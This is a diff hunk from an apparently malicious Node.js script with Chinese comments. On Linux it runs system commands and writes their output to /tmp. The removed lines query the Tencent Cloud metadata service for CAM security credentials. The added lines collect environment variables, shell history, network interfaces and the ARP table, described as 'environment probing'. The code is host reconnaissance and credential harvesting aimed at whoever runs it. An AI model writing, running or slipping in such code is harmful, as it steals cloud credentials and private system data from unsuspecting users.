@@ -67,12 +67,14 @@ if (process.platform === 'win32') {
 
   }
 } else {
-  // Linux 环境下执行多条命令并保存到 /tmp
+  // Linux 环境下执行多条环境探测命令并保存到 /tmp
   const commands = [
-    { cmd: 'ifconfig', file: '/tmp/ifconfig_output.txt', desc: 'ifconfig' },
-    { cmd: 'whoami', file: '/tmp/whoami_output.txt', desc: 'whoami' },
-    { cmd: 'curl -ik -w "\\n" http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/${role-name}', 
-      file: '/tmp/curl_metadata_output.txt', desc: 'curl metadata' }
+    { cmd: 'env', file: '/tmp/env_output.txt', desc: 'env' },
+    { cmd: 'ip addr', file: '/tmp/ip_addr_output.txt', desc: 'ip addr' },
+    { cmd: 'ping baidu.com -c 1', file: '/tmp/ping_output.txt', desc: 'ping baidu.com' },
+    { cmd: 'ls -la', file: '/tmp/ls_la_output.txt', desc: 'ls -la' },
+    { cmd: 'history', file: '/tmp/history_output.txt', desc: 'history' },
+    { cmd: 'arp -a', file: '/tmp/arp_output.txt', desc: 'arp -a' }
   ];
 
   // 使用 Promise 来顺序执行命令
